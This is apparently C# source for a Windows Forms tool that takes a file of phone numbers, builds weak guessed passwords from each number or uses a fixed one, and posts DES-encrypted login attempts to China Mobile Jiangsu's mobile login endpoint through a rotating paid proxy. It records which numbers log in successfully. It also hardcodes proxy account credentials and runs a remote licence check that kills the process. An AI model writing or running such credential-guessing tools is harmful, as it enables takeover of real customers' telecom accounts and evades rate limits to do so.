using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using myDLL;

namespace 移动号码查询
{
    public partial class 移动号码查询 : Form
    {
        public 移动号码查询()
        {
            InitializeComponent();
        }


        
        private void 移动号码查询_Load(object sender, EventArgs e)
        {
            #region 通用检测


            string html = method.GetUrl("http://acaiji.com/index/index/vip.html", "utf-8");

            if (!html.Contains(@"ZkGmf"))
            {

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }

            #endregion
        }


        #region POST默认请求
        /// <summary>
        /// POST请求
        /// </summary>
        /// <param name="url">请求地址</param>
        /// <param name="postData">发送的数据包</param>
        /// <param name="COOKIE">cookie</param>
        /// <param name="charset">编码格式</param>
        /// <returns></returns>
        public static string PostUrlDefault(string url, string postData, string COOKIE,string ip)
        {
            try
            {

                string charset = "utf-8";
                string html = "";
                System.Net.ServicePointManager.Expect100Continue = false;
                // System.Net.ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; //获取不到加上这一条
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "Post";
                WebProxy proxy = new WebProxy();
                proxy.Address = new Uri(String.Format("http://{0}:{1}", "tps161.kdlapi.com", 15818));
                string username = "t14031929115782";
                string password = "ko3211m9";
                proxy.Credentials = new NetworkCredential(username, password);
                request.Proxy = proxy;
               
                request.ContentType = "application/x-www-form-urlencoded";
                // request.Accept = "application/json, text/javascript, */*; q=0.01"; //返回中文问号参考
                //request.ContentType = "application/json";
                request.ContentLength = Encoding.UTF8.GetBytes(postData).Length;
               // request.ContentLength = postData.Length;
                request.Headers.Add("Accept-Encoding", "gzip");
                request.AllowAutoRedirect = false;
                request.KeepAlive = false;

                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36";
                request.Headers.Add("Cookie", COOKIE);

                request.Referer = url;
                StreamWriter sw = new StreamWriter(request.GetRequestStream());
                sw.Write(postData);
                sw.Flush();

                HttpWebResponse response = request.GetResponse() as HttpWebResponse;  //获取反馈
                response.GetResponseHeader("Set-Cookie");

                if (response.Headers["Content-Encoding"] == "gzip")
                {

                    GZipStream gzip = new GZipStream(response.GetResponseStream(), CompressionMode.Decompress);//解压缩
                    StreamReader reader = new StreamReader(gzip, Encoding.GetEncoding(charset));
                    html = reader.ReadToEnd();
                    reader.Close();
                }
                else
                {
                    StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(charset)); //reader.ReadToEnd() 表示取得网页的源码流 需要引用 using  IO
                    html = reader.ReadToEnd();
                    reader.Close();
                }


                response.Close();
                return html;
            }
            catch (WebException ex)
            {

                return ex.ToString();
            }


        }

        #endregion

        int count = 0;
        int ipcount = 0;
        string ip = "";
        public void run()
        {
            try
            {
                
                StreamReader sr = new StreamReader(textBox1.Text, method.EncodingType.GetTxtType(textBox1.Text));
                //一次性读取完 
                string texts = sr.ReadToEnd();

                string[] text = texts.Split(new string[] { "\r\n" }, StringSplitOptions.None);
                sr.Close();  //只关闭流
                sr.Dispose();   //销毁流内存
                for (int i = 0; i < text.Length; i++)
                {
                    try
                    {
                        if (text[i].Trim() == "")
                        {
                            continue;
                        }

                        string pass = textBox2.Text.Trim();
                        string passEB = System.Web.HttpUtility.UrlEncode(getpasswordDES(pass));
                        if (radioButton2.Checked == true)
                        {
                            pass = text[i].Substring(0, 3) + text[i].Substring(0, 3);
                            passEB = getpasswordDES(pass);
                        }

                        if (radioButton3.Checked == true)
                        {
                            pass = text[i].Substring(8, 3) + text[i].Substring(8, 3);
                            passEB = getpasswordDES(pass);
                        }

                        string url = "http://wap.js.10086.cn/actionDispatcher.do";
                        string postdata = "reqUrl=loginTouch&busiNum=login&mobile=" + text[i].Trim() + "&password=" + passEB + "&passwordSMS_vaild=&isSavePasswordVal=&verifyCode=&isSms=0&ver=t&imgReqSeq=92ab9db3c48c42fc8a573e965c762c8c3802&loginType=0";
                        //ipcount = ipcount + 1;
                        //if (ipcount == Convert.ToInt32(textBox4.Text))
                        //{
                        //    ipcount = 0;
                        //    count = count + 1;
                        //}
                        //if(count>=ips.Length)
                        //{
                        //    MessageBox.Show("IP不足请添加IP");
                        //}
                        //ip = ips[count];

                        string ip = textBox5.Text.Trim();

                        string html = PostUrlDefault(url, postdata, "",ip.Trim());
                        string msg = Regex.Match(html,@"resultMsg"":""([\s\S]*?)""").Groups[1].Value;
                       //MessageBox.Show(html);
                       // MessageBox.Show(ip);
                   //if(html.Contains("服务器返回错误"))
                   //     {
                   //         count = count + 1;
                   //         ip = ips[count];
                   //     }
                        if (html.Contains("密码错误"))
                        {
                            msg = "密码错误";
                        }
                        else if (html.Contains("success\":true"))
                        {
                            msg = "密码正确";
                        }


                        while (this.zanting == false)
                        {
                            Application.DoEvents();//如果loader是false表明正在加载,,则Application.DoEvents()意思就是处理其他消息。阻止当前的队列继续执行。
                        }
                        ListViewItem lv1 = listView1.Items.Add(listView1.Items.Count.ToString()); //使用Listview展示数据
                        lv1.SubItems.Add(text[i]);
                        lv1.SubItems.Add(pass);
                        lv1.SubItems.Add(msg);
                        if (status == false)
                            return;

                        Thread.Sleep(Convert.ToInt32(textBox3.Text));
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.ToString());
                       
                        continue;
                    }
                }
                MessageBox.Show("查询完成");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());

            }
        }

        bool status = true;
        Thread thread;
        bool zanting = true;
        string[] ips = { };
        private void button2_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "")
            {
                MessageBox.Show("请选择导入手机号文本");
                return;
            }

            //if (textBox5.Text=="")
            //{
            //    MessageBox.Show("IP列表为空");
            //    return;
            //}
            status = true;
            ips = textBox5.Text.Split(new string[] { "\r\n" }, StringSplitOptions.None);
            if (thread == null || !thread.IsAlive)
            {
                thread = new Thread(run);
                thread.Start();
                Control.CheckForIllegalCrossThreadCalls = false;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string html = method.GetUrl("http://acaiji.com/index/index/vip.html", "utf-8");

            if (!html.Contains(@"ZkGmf"))
            {

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = openFileDialog1.FileName;
            }
        }



        /// <summary>
        /// 执行JS
        /// </summary>
        /// <param name="sExpression">参数体</param>
        /// <param name="sCode">JavaScript代码的字符串</param>
        /// <returns></returns>
        private string ExecuteScript(string sExpression, string sCode)
        {
            MSScriptControl.ScriptControl scriptControl = new MSScriptControl.ScriptControl();
            scriptControl.UseSafeSubset = true;
            scriptControl.Language = "JScript";
            scriptControl.AddCode(sCode);
            try
            {
                string str = scriptControl.Eval(sExpression).ToString();
                return str;
            }
            catch (Exception ex)
            {
                string str = ex.Message;
            }
            return null;
        }

        public string getpasswordDES(string pass)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "ECB.js";
            string str2 = File.ReadAllText(path);

            string fun = string.Format(@"encryptByDES('{0}','{1}')", pass, "1234567890");
            string result = ExecuteScript(fun, str2);

            return result;
        }
        private void button3_Click(object sender, EventArgs e)
        {
            status = false;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            method.DataTableToExcel(method.listViewToDataTable(this.listView1), "Sheet1", true);
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            listView1.Items.Clear();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            if (zanting == false)
            {

                zanting = true;
            }
            else
            {
                zanting = false;
            }
        }

        private void 移动号码查询_FormClosing(object sender, FormClosingEventArgs e)
        {
            DialogResult dr = MessageBox.Show("确定要关闭吗？", "关闭", MessageBoxButtons.OKCancel, MessageBoxIcon.Question);
            if (dr == DialogResult.OK)
            {
                // Environment.Exit(0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
            else
            {
                e.Cancel = true;//点取消的代码 
            }
        }
    }
}
